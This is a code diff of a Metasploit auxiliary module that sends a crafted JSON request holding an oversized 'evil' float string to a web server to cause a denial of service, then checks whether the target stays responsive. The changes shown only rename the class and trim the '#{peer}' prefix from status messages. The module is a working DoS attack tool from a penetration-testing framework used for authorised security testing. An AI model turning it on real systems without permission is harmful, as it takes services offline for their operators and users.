@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Dos
@@ -75,11 +75,11 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    print_status "#{peer} - Using digit pattern of #{digit_pattern} taken to #{multiplier} places"
+    print_status "Using digit pattern of #{digit_pattern} taken to #{multiplier} places"
     sploit = '['
     sploit << evil_float_string
     sploit << ']'
-    print_status "#{peer} - Sending DoS HTTP#{datastore['SSL'] ? 'S' : ''} #{verb} request to #{uri}"
+    print_status "Sending DoS HTTP#{datastore['SSL'] ? 'S' : ''} #{verb} request to #{uri}"
     target_available = true
 
     begin
@@ -91,19 +91,19 @@ class Metasploit3 < Msf::Auxiliary
           'data'    => sploit
         })
     rescue ::Rex::ConnectionRefused
-      print_error "#{peer} - Unable to connect. (Connection refused)"
+      print_error "Unable to connect. (Connection refused)"
       target_available = false
     rescue ::Rex::HostUnreachable
-      print_error "#{peer} - Unable to connect. (Host unreachable)"
+      print_error "Unable to connect. (Host unreachable)"
       target_available = false
     rescue ::Rex::ConnectionTimeout
-      print_error "#{peer} - Unable to connect. (Timeout)"
+      print_error "Unable to connect. (Timeout)"
       target_available = false
     end
 
     return unless target_available
 
-    print_status "#{peer} - Checking availability"
+    print_status "Checking availability"
     begin
       res = send_request_cgi({
         'method' => verb,
@@ -118,13 +118,13 @@ class Metasploit3 < Msf::Auxiliary
         target_available = false
       end
     rescue ::Rex::ConnectionError, Errno::ECONNRESET
-      print_good "#{peer} - DoS appears successful (Host unreachable)"
+      print_good "DoS appears successful (Host unreachable)"
       target_available = false
     end
 
     return unless target_available
 
-    print_status "#{peer} - Target is still responsive, DoS was unsuccessful."
+    print_status "Target is still responsive, DoS was unsuccessful."
 
   end
 end
